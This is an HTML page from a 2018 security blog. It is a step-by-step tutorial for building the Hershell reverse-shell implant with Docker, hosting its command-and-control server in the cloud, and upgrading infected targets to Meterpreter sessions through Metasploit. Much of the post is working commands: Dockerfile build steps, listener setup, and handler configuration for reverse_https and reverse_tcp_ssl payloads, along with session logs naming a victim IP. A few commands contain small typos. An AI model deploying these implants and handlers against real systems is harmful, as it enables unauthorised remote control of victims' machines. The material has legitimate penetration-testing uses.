@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>Cloud reverse-shell: Hershell, Metasploit and Docker :: khast3x blog — Thoughts and notes on my side projects</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content=" In the following article we&amp;rsquo;ll be deploying Hershell, a minimal golang reverse shell, and its C2 using Docker to host it on a cloud provider&amp;rsquo;s infrastructure.
+One of the many powers of golang is it&amp;rsquo;s cross platform capabilities. Since the codebase is minimal, we&amp;rsquo;ll see how to use a container to host our C2.
+"/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://khast3x.club/posts/2018-10-02-docker-c2-hershell-metasploit/" />
+
+
+
+
+
+<link rel="stylesheet" href="https://khast3x.club/assets/style.css">
+
+
+<link rel="stylesheet" href="https://khast3x.club/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://khast3x.club/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="https://khast3x.club/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Cloud reverse-shell: Hershell, Metasploit and Docker"/>
+<meta name="twitter:description" content="Quickly deploy a minimal cross-platform shell and host the Command Center using Docker. Upgrade to a meterpreter shell seamlessly"/>
+
+
+
+<meta property="og:title" content="Cloud reverse-shell: Hershell, Metasploit and Docker" />
+<meta property="og:description" content="Quickly deploy a minimal cross-platform shell and host the Command Center using Docker. Upgrade to a meterpreter shell seamlessly" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://khast3x.club/posts/2018-10-02-docker-c2-hershell-metasploit/" />
+<meta property="article:published_time" content="2018-10-02T00:00:00+00:00" />
+<meta property="article:modified_time" content="2018-10-02T00:00:00+00:00" /><meta property="og:site_name" content="khast3x blog" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">khast3x blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  <div class="post">
+    <h2 class="post-title"><a href="https://khast3x.club/posts/2018-10-02-docker-c2-hershell-metasploit/">Cloud reverse-shell: Hershell, Metasploit and Docker</a></h2>
+    <div class="post-meta">
+      
+        <span class="post-date">
+            2018-10-02
+        </span>
+      
+      
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="https://khast3x.club/tags/shell/">shell</a>&nbsp;
+        
+          #<a href="https://khast3x.club/tags/metasploit/">metasploit</a>&nbsp;
+        
+          #<a href="https://khast3x.club/tags/cloud/">cloud</a>&nbsp;
+        
+          #<a href="https://khast3x.club/tags/aws/">aws</a>&nbsp;
+        
+          #<a href="https://khast3x.club/tags/azure/">azure</a>&nbsp;
+        
+          #<a href="https://khast3x.club/tags/gce/">gce</a>&nbsp;
+        
+          #<a href="https://khast3x.club/tags/pentest/">pentest</a>&nbsp;
+        
+          #<a href="https://khast3x.club/tags/golang/">golang</a>&nbsp;
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      <hr>
+<p>In the following article we&rsquo;ll be deploying Hershell, a minimal golang reverse shell, and its C2 using Docker to host it on a cloud provider&rsquo;s infrastructure.<br>
+One of the many powers of golang is it&rsquo;s cross platform capabilities. Since the codebase is minimal, we&rsquo;ll see how to use a container to host our C2.</p>
+<hr>
+<h1 id="goal">Goal</h1>
+<p>We want to use Docker to build a fresh <a href="https://github.com/lesnuages/hershell">hershell</a> implant and easily distribute it.</p>
+<p><a href="https://github.com/lesnuages/hershell">Hershell</a> comes with the ability to upgrade the infected target to a <code>meterpreter</code> implant or inject shellcode directly in memory. We&rsquo;ll also be using Docker to host our second stage Metasploit C2.</p>
+<p>Once done, generating, sharing and managing the implant should be a fast and cloud-native process.</p>
+<p>Deploying a server to catch the reverse callback will be fast and clean.</p>
+<h1 id="requirements">Requirements</h1>
+<p>You&rsquo;ll need a <code>docker</code> environment <a href="https://docs.docker.com/install/">installed</a>, and some place to host your C2 and C3.<br>
+Since we&rsquo;re using containers, you can very well try this on your local machine.<br>
+I recommend looking into <a href="https://github.com/ripienaar/free-for-dev">free tiers</a> from providers such as AWS, Azure or Google Cloud Engine, as you can hardly beat their datacenter Internet speed.</p>
+<p>Some basic UNIX and Docker knowledge is expected.</p>
+<h1 id="why-hershell">Why hershell</h1>
+<p>Hershell aims to be the opposite of a feature-rich implant.<br>
+It is elegant in its simplicity, written in golang making it cross-platform.<br>
+Once infected, the target can be upgraded to a meterpreter shell with multiple egress methods.</p>
+<p>The meterpreter staging currently supports the following payloads :</p>
+<ul>
+<li><code>windows/meterpreter/reverse_tcp</code></li>
+<li><code>windows/x64/meterpreter/reverse_tcp</code></li>
+<li><code>windows/meterpreter/reverse_http</code></li>
+<li><code>windows/x64/meterpreter/reverse_http</code></li>
+<li><code>windows/meterpreter/reverse_https</code></li>
+<li><code>windows/x64/meterpreter/reverse_https</code></li>
+</ul>
+<p>Hershell generates a TLS certificate/key thats to cypher communications with the implant, so we&rsquo;ll want to easily recover those too.</p>
+<h1 id="steps">Steps</h1>
+<h2 id="creating-a-hershell-build-with-a-dockerfile">Creating a Hershell build with a Dockerfile</h2>
+<h3 id="building">Building</h3>
+<p>We&rsquo;ll create the Dockerfile in two steps.<br>
+First, we&rsquo;ll build hershell and its server using the provided Makefile.<br>
+Second, we&rsquo;ll launch a minimal HTTP server to easily fetch the generated binaries and cert.</p>
+<h4 id="base">Base</h4>
+<p>We&rsquo;ll be building the hershell implants using a <code>golang:alpine</code> base to keep it small (OS is ~20MB).</p>
+<p>A quick note about golang containers, there is a <code>/go</code> root dir where <code>/go/bin/</code> is the compiled binaries destination folder, and the <code>/go/src/</code> folder populated with source code.</p>
+<p>Since hershell is hosted on github, we can simply tell golang to fetch it using the <code>go get -u github.com/lesnuages/hershell</code> command.</p>
+<p>Finally, we&rsquo;ll need the <code>make</code>, <code>git</code> and <code>openssl</code> packages too.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">FROM golang:alpine
+
+RUN apk add --update make git openssl <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    <span style="color:#f92672">&amp;&amp;</span> go get github.com/lesnuages/hershell
+
+WORKDIR /go/src/github.com/lesnuages/hershell/
+
+</code></pre></div><h4 id="build-args">Build Args</h4>
+<p>Dockerfiles have the ability to use <code>build-args</code>, that&rsquo;s what we&rsquo;ll use to give hershell it&rsquo;s home address.<br>
+<a href="https://docs.docker.com/engine/reference/builder/#arg"><em>More info</em></a>.</p>
+<p>We&rsquo;ll be using the following arguments to build our hershell implant:</p>
+<ul>
+<li>C2 IP/Domain name</li>
+<li>C2 Reverse port</li>
+<li>32/64bit target architecture</li>
+</ul>
+<p>Default values to avoid problems when testing.</p>
+<pre><code>ARG LHOST=127.0.0.1
+ARG LPORT=8080
+ARG GOARCH=64
+</code></pre><h4 id="compilation">Compilation</h4>
+<p>For our test, I&rsquo;ll be compiling the Linux and Windows binaries at every docker build. For some reason Windows binaries don&rsquo;t get moved to <code>/go/bin/</code> so we&rsquo;ll copy them.<br>
+Since we need to retrieve our certificates, we&rsquo;ll copy these too.</p>
+<pre><code>RUN make depends &amp;&amp; make windows${GOARCH} LHOST=${LHOST} LPORT=${LPORT} \
+    &amp;&amp; make linux${GOARCH} LHOST=${LHOST} LPORT=${LPORT} \
+    &amp;&amp; cp server.key server.pem *.exe /go/bin/ 
+    
+</code></pre><h3 id="sharing">Sharing</h3>
+<p>There&rsquo;s hardly an easier method than the classic <code>python -m SimpleHTTPServer</code> to serve files using a quick web server.</p>
+<p>Since we&rsquo;re using a golang image, it would be counter-productive to add another language environment to our container. Instead, we&rsquo;ll use <code>serve</code>, a <a href="https://github.com/fogleman/serve"><em>simple Go file server for command line development use, a la Python&rsquo;s SimpleHTTPServer</em></a>.<br>
+Perfect :smirk:</p>
+<p>We&rsquo;ll simply <code>go get</code>-it like our <code>hershell</code> package. <code>serve</code> uses port 8000 by default.</p>
+<pre><code>RUN apk add --update make git openssl upx \
+    &amp;&amp; go get github.com/lesnuages/hershell \
+    &amp;&amp; go get -u github.com/fogleman/serve
+
+</code></pre><p>Finally, we&rsquo;ll have our Dockerfile <code>EXPOSE</code> the port and <code>serve</code> our generated binaries and TLS cert&amp;key.</p>
+<pre><code>EXPOSE 8000
+ENTRYPOINT [ &quot;serve&quot;, &quot;-dir&quot;, &quot;/go/bin/&quot;]
+</code></pre><ul>
+<li>Let&rsquo;s see how this goes</li>
+</ul>
+<p><img src="https://github.com/khast3x/khast3x.github.io/blob/master/assets/demo/hershell_build.gif?raw=true" alt="build"></p>
+<p><img src="https://github.com/khast3x/khast3x.github.io/blob/master/assets/demo/hershell_serve.png?raw=true" alt="serve"></p>
+<p><a href="https://github.com/khast3x/hershell/blob/master/Dockerfile">You can find the final Dockerfile here</a></p>
+<h2 id="deploying-the-implant">Deploying the implant</h2>
+<p>To launch our web page and fetch our files, we simply run:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker run -d hershell:latest
+</code></pre></div><p>Point your web browser to <code>http://DOCKER-HOST-IP:8000</code>, download the implant for your target environment, as well as <code>server.pem</code> and <code>server.key</code> for our C2.</p>
+<p>Alternatively, you can use <code>wget</code> or <code>curl</code>.</p>
+<p>You should keep the hershell container running as we&rsquo;ll need to fetch our certificate and key with Metasploit.</p>
+<h3 id="ncat-with-tls-cert--key">Ncat with TLS cert &amp; key</h3>
+<p>To catch the initial reverse call, we&rsquo;ll use the <code>ncat</code> example provided. <code>ncat</code> can be found in the <code>nmap</code> package.</p>
+<p>Once our <code>server.pem</code> and <code>server.key</code> files downloaded, we can set it up like so:</p>
+<pre><code>$ cat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 8088
+</code></pre><p>If everything goes according to plan, running the hershell binary should get you a clean reverse connection to the ncat listener.</p>
+<p><img src="https://github.com/khast3x/khast3x.github.io/blob/master/assets/demo/hershell_ncat.png?raw=true" alt="rev"></p>
+<h3 id="msf">MSF</h3>
+<p><a href="https://hub.docker.com/r/remnux/metasploit/">This</a> build encapsulates the Metasploit Framework, as well as a pre-configured <code>postgresql</code> server with the <code>msfdb</code> working.
+The <code>nmap</code> package is also pre installed, meaning we have <code>ncat</code> in the container too.</p>
+<h3 id="launch">Launch</h3>
+<p>We&rsquo;re going to upgrade our hershell to a meterpreter session, using a dockerized Metasploit console.</p>
+<p>Contrary to the previous method, MSF will only need our <code>server.pem</code> file.</p>
+<p>To launch our <code>metasploit</code> container, we simply do:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ docker run -it -p <span style="color:#e6db74">&#34;8443:8443&#34;</span> -v ~/.msf4:/root/.msf4 -v /tmp/msf:/tmp/data remnux/metasploit
+</code></pre></div><p>The first run might take some time, so leave it running a few minutes :coffee:</p>
+<p>We&rsquo;re using the <code>docker run</code> line from the <a href="https://hub.docker.com/r/remnux/metasploit/">Docker hub page</a>.</p>
+<h3 id="use">Use</h3>
+<p>Once the container is up and running, you&rsquo;ll land in a bash shell.<br>
+You&rsquo;ll find all the classic <code>msf</code> framework tools.</p>
+<p><img src="https://github.com/khast3x/khast3x.github.io/blob/master/assets/demo/hershell_msf_binaries.png?raw=true" alt="msf">
+We&rsquo;ll launch the <code>msfconsole</code> and let it load. Once you&rsquo;re greeted with the prompt, we&rsquo;ll need to retrieve our <code>server.pem</code>.</p>
+<p>We can use <code>wget</code> from inside the <code>msfconsole</code> and fetch them from our previously mentioned <code>serve</code> http page.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfconsole
+msf5 &gt; wget http://DOCKER-IP:8000/server.pem
+
+</code></pre></div><p>Next, we&rsquo;re preparing our handler. I&rsquo;ll be using the <code>reverse_https</code> method.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 &gt; use exploit/multi/handler
+msf5 &gt; set payload windows/x64/meterpreter/reverse_https
+msf5 &gt; set lhost DOCKER-IP
+msf5 &gt; set lport <span style="color:#ae81ff">8443</span>
+msf5 &gt; set HandlerSSLCert ./server.pem
+msf5 &gt; exploit -j
+
+</code></pre></div><p>In your hershell console, type:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hershell<span style="color:#f92672">]</span>&gt; meterpreter https YOUR-DOCKER-IP:8443
+</code></pre></div><p>And hopefully, you&rsquo;ll be seeing this in your <code>msfconsole</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started HTTPS reverse handler on https://0.0.0.0:8443
+cleear
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> https://DOCKER-IP:8443 handling request from VICTIM-IP; <span style="color:#f92672">(</span>UUID: q4jynvuf<span style="color:#f92672">)</span> Staging x64 payload <span style="color:#f92672">(</span><span style="color:#ae81ff">207449</span> bytes<span style="color:#f92672">)</span> ...
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>DOCKER-IP:8443 -&gt; VICTIM-IP:40238<span style="color:#f92672">)</span> at 2018-10-04 02:09:35 +0000
+
+</code></pre></div><h3 id="multi-hershell-session-handling-from-metasploit">Multi hershell session handling from Metasploit</h3>
+<p>Catching sessions with <code>ncat</code> is nice and easy, but it does not handle <em>multi sessions</em>. We can use the Metasploit <code>python/shell_reverse_tcp_ssl</code> payload.</p>
+<p>Use <code>sessions</code> to interact with your targets from inside the <code>msfconsole</code>  prompt.</p>
+<p>Let&rsquo;s set Metasploit up to receive both our stages in a single shot. Starting from the top:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 &gt; wget http://DOCKER-IP:8000/server.pem
+msf5 &gt; use exploit/multi/handler
+msf5 &gt; set payload python/shell_reverse_tcp_ssl
+msf5 &gt; set HandlerSSLCert ./server.pem
+msf5 &gt; set lhost DOCKER-IP
+msf5 &gt; set lport <span style="color:#ae81ff">8088</span>
+msf5 &gt; exploit -j
+<span style="color:#75715e"># Our first hershell listener is now running as a job in the background</span>
+
+msf5 &gt; set payload windows/x64/meterpreter/reverse_https
+msf5 &gt; set lport <span style="color:#ae81ff">8443</span>
+msf5 &gt; exploit -j
+msf5 &gt; sessions -l
+</code></pre></div><p>Launch hershell as you would and&hellip;</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command shell session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>DOCKER-IP:8088 -&gt; VICTIM:39370<span style="color:#f92672">)</span> at 2018-10-04 02:26:32 +0000
+</code></pre></div><h2 id="more-tricks">More tricks</h2>
+<h3 id="using-docker-machine">Using docker-machine</h3>
+<p>You can use <a href="https://docs.docker.com/machine/">docker-machine</a> to seamlessly deploy your C2 instances across different cloud providers.</p>
+<h3 id="make-a-rc-file">Make a rc file</h3>
+<p>Once you have a working configuration in your Metasploit environment, you use the <code>makerc hershell.rc</code> to generate a config file. From there you can <code>cat</code> it from the prompt or push it elsewhere.</p>
+    </div>
+    
+    
+
+    
+      
+    
+    
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">khast3x blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://khast3x.club/assets/main.js"></script>
+<script src="https://khast3x.club/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+      
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-113498686-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    
+  </body>
+</html>
